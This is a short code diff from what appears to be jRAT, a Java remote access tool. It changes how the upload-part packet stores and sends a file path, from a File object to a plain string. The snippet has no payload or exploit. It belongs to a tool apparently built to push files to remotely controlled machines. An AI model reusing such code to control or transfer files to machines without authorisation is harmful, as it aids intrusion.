@@ -8,11 +8,11 @@ import se.jrat.common.io.StringWriter;
 
 public class Packet29ClientUploadPart extends AbstractOutgoingPacket {
 
-	private File file;
+	private String file;
 	private byte[] part;
 	private int to;
 	
-	public Packet29ClientUploadPart(File file, byte[] part, int to) {
+	public Packet29ClientUploadPart(String file, byte[] part, int to) {
 		this.file = file;
 		this.part = part;
 		this.to = to;
@@ -20,7 +20,7 @@ public class Packet29ClientUploadPart extends AbstractOutgoingPacket {
 	
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(file.getAbsolutePath());
+		sw.writeLine(file);
 
 		dos.writeInt(to);
 		dos.write(part, 0, to);
